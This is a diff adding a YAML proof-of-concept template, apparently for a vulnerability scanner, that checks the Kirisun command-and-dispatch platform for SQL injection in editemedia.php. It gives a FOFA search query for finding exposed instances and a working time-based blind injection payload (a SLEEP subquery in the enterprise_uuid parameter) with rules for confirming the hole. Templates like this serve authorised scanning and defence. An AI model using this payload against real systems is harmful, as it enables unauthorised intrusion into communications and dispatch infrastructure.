@@ -1,0 +1,21 @@
+id: poc-yaml-kirisun-editemedia-sqli
+info:
+  name: 福建科立讯通信指挥调度平台editemedia.php sql注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /api/client/editemedia.php
+  expression: status_code == 200 && contains(body,"code") && contains(body,"msg")
+    && duration <= 5
+- method: GET
+  path: /api/client/editemedia.php?enterprise_uuid=1%27%20AND%20(SELECT%203257%20FROM%20(SELECT(SLEEP({{.t1}})))JPVs)%20AND%20%27gDyM%27=%27gDyM
+  expression: status_code == 200 && duration >= t1 && duration <= t2 && contains(body,`"code":"-1"`)
+    && contains(body,`"msg":"user not found"`)
+transport: http
